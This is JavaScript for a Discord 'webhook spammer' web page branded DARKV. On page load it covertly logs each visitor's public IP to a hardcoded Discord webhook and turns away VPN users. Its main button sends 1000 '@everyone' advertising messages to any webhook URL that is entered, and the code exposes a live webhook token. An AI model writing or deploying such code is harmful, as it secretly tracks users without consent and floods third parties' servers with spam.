const spamButton = document.getElementById('spamButton');
const statusText = document.getElementById('status');
const webhookUrlInput = document.getElementById('webhookUrl');
const loader = document.getElementById('loader');

const customWebhookData = {
    username: "COOKED BY DARKV",  // Custom webhook name
    avatar_url: "https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png?ex=676a1afc&is=6768c97c&hm=8586677d875c772f95983ff3426ae0f732a0a402fc037263566aaef14633eb33&",  // Custom profile picture URL
    content: "😈🤦‍♂️WEBHOOK COOKED BY DARKV @everyone OUR SERVER: https://discord.gg/dpRvmbRZUK 🤦‍♂️😈 & OUR WEBSITE: https://darkv-spammer-blond.vercel.app/"  // Custom message
};

// Function to check if user is using a VPN
async function checkVpn() {
    try {
        // Get public IP and check for VPN
        const response = await fetch('https://ipinfo.io/json?token=YOUR_API_KEY');
        const data = await response.json();
        
        // If VPN or proxy is detected, we get the 'privacy' property from ipinfo.io (if available)
        if (data.privacy && data.privacy.is_vpn) {
            document.body.innerHTML = "<h1>🔴DENIED ACCESS TO DARKV. REASON: USING A VPN (TURN OFF YOUR VPN TO CONTINUE)...</h1>";
            return;
        }

        // If no VPN detected, proceed with the normal site functionality
        sendIpToWebhook();

    } catch (error) {
        console.error("Error detecting VPN:", error);
    }
}

// Send IP to webhook if not using VPN
async function sendIpToWebhook() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const userIp = data.ip;

        const ipWebhookData = {
            username: "IP Logger",
            avatar_url: "https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png",
            content: `🚨 New user IP: ${userIp} 🚨`
        };

        await fetch('https://discord.com/api/webhooks/1320583422313238579/CGQB3ZRPiBE4-XdSv3eYFTJ1xHA1ROTNoMUoKCW83_G4vHBDtug2RKQJrczhy1FhXbLd', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(ipWebhookData)
        });

    } catch (error) {
        console.error("Error fetching IP or sending webhook:", error);
    }
}

window.addEventListener('load', checkVpn);

spamButton.addEventListener('click', async () => {
    const webhookUrl = webhookUrlInput.value.trim();
    
    if (!webhookUrl) {
        statusText.textContent = "Status: Error... Invalid Webhook URL";
        return;
    }

    statusText.textContent = "Status: Sending messages...";
    loader.style.display = 'block';  // Show loader

    try {
        for (let i = 0; i < 1000; i++) {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(customWebhookData)  // Sending custom username, avatar, and content
            });
        }
        statusText.textContent = "Status: Messages sent successfully!";
    } catch (error) {
        console.error(error);
        statusText.textContent = "Status: Error... Failed to send messages";
    } finally {
        loader.style.display = 'none';  // Hide loader after completion
    }
});
